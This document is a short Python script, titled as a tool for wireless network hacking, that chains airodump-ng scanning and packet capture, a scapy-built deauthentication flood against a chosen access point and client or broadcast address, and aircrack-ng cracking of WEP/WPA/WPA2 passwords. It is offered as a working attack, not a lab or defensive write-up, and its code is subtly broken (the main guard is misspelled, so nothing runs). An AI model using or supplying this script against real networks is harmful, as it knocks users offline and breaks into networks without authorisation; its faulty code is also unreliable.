Python Script for Wireless Network Hackingimport os
from scapy.all import *

# Scan for nearby wireless networks
def scan_networks(interface):
    print("Scanning for nearby networks...")
    os.system(f"airodump-ng {interface}")

# Capture packets
def capture_packets(interface, duration):
    print(f"Capturing packets for {duration} seconds...")
    os.system(f"airodump-ng -w capture --output-format pcap {interface}")
    time.sleep(duration)
    os.system("pkill airodump-ng")

# Perform deauthentication attack
def deauth_attack(interface, target_bssid, target_client):
    print("Performing deauthentication attack...")
    packet = RadioTap() / Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    sendp(packet, iface=interface, count=100, inter=0.1)

# Crack WEP/WPA/WPA2 passwords
def crack_passwords(capture_file):
    print("Cracking passwords...")
    os.system(f"aircrack-ng {capture_file}")

def main():
    interface = input("Enter the wireless interface (e.g., wlan0): ")
    scan_networks(interface)
    duration = int(input("Enter the duration to capture packets (in seconds): "))
    capture_packets(interface, duration)
    
    attack_choice = input("Do you want to perform a deauthentication attack? (yes/no): ")
    if attack_choice.lower() == "yes":
        target_bssid = input("Enter the target BSSID: ")
        target_client = input("Enter the target client MAC address (or 'ff:ff:ff:ff:ff:ff' for broadcast): ")
        deauth_attack(interface, target_bssid, target_client)
    
    capture_file = input("Enter the path to the capture file (.cap): ")
    crack_passwords(capture_file)

if _name_ == "_main_":
    main()
